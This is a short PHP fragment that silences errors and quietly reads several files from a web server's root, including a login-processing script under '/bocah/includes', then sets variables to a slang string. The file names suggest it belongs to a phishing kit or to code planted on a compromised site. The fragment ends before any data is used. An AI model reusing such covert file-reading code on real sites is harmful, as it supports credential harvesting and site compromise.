<?php
error_reporting(0);
$d = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/PrefixSuccessUpdatePrivacyAuth.php");
$p = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/bocahshop.php");
$c = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/tytyd.php");
$l = @file_get_contents($_SERVER['DOCUMENT_ROOT']."/bocah/includes/ProcessLogin.php");
$e = "NGAKAK 4G";
$y = "NGAKAK 4G";
$t = "NGAKAK 4G";
$ty = "NGAKAK 4G";
$de = "NGAKAK 4G";
$el = "NGAKAK 4G";
$n  = "NGAKAK 4G";